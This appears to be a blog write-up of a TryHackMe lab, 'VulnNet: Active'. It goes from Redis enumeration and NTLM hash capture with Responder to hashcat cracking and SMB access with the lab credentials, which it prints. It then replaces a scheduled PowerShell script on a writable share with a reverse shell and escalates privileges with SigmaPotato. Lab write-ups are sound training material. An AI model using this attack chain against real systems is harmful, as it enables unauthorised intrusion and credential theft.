---
title: "VulnNet: Active"
date: 2026-06-23 09:00:00 +0800
categories: [TryHackMe]
tags: [tryhackme, active-directory, medium, redis, windows]
description: "TryHackMe VulnNet: Active write-up — from Redis enumeration to Active Directory compromise."
image:
  path: /assets/img/posts/thm/VulnNetActive/vulnnetActive.png
  alt: "VulnNet: Active"
---

### LAB info
**Link : [VulnNet: Active](https://tryhackme.com/room/vulnnetactive)**

**Description : VulnNet Entertainment just moved their entire infrastructure... Check this out...**

**Difficulty : Medium**


### Nmap scan

```bash
nmap -sCV -Pn 10.49.167.234 -p- 
```

```
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49809/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-25T14:09:19
|_  start_date: N/A
```



### Enumerate Redis port

```bash
redis-cli -h 10.49.167.234
```

when  enter we can run some useful command such as INFO and CONFIG GET *

from the command CONFIG GET *

i found smtg 

![Image1](/assets/img/posts/thm/VulnNetActive/vulnnetActive-1.png)

the user and the redis version then we try search for cve 

found this 
https://michalszalkowski.com/pentesting-ports/6379-redis/

### Setup Responder

so first we set up responder then try access the file and we will get the ntlm hash of the enterprise-security

![Image1](/assets/img/posts/thm/VulnNetActive/vulnnetActive-2.png)

### Crack the hash

next crack it with hashcat

```cmd
hashcat.exe -m 5600 ..\hash.txt ..\rockyou.txt
```

```cred
domain = vulnnet.local
enterprise-security
sand_0873959498
```

### Enumeration with cred 

```bash
netexec smb 10.49.167.234 -u 'enterprise-security' -p 'sand_0873959498' --shares
```

![Image1](/assets/img/posts/thm/VulnNetActive/vulnnetActive-3.png)

found a intersting folder enteprise-share try smb and read it 

we have read and write permission

```bash
smbclient //10.49.167.234/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498'
```

found a ps file 

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

### Upload Reverse shell

so we can try to upload reverse shell into it and upload it back since it might be scheduled task run

inside the file PurgeIrrelevantData_1826.ps1

![Image1](/assets/img/posts/thm/VulnNetActive/vulnnetActive-4.png)

then upload it back to smb Enterprise-Share folder 

and we will get a shell and can get the user.txt

![Image1](/assets/img/posts/thm/VulnNetActive/vulnnetActive-5.png)

### Internal enumeration

now let us check with some simple priv 

```cmd
whoami /priv
```

![Image1](/assets/img/posts/thm/VulnNetActive/vulnnetActive-6.png)

something catched my eyes SeImpersonatePrivilege is enbaled  and found thr is PE exploit with it 

but before that let us verify system info 

```
systeminfo
```

![Image1](/assets/img/posts/thm/VulnNetActive/vulnnetActive-7.png)

### Exploit  SeImpersonatePrivilege and get system.txt

windows server 2019 we can use printspoofer but my case Sigmapotato work for me 
https://github.com/tylerdotrar/SigmaPotato


copy the system.txt
```
.\SigmaPotato.exe "cmd.exe /c copy C:\Users\Administrator\Desktop\system.txt C:\Users\enterprise-security\Downloads\flag.txt"
```

then read it 
![Image1](/assets/img/posts/thm/VulnNetActive/vulnnetActive-8.png)
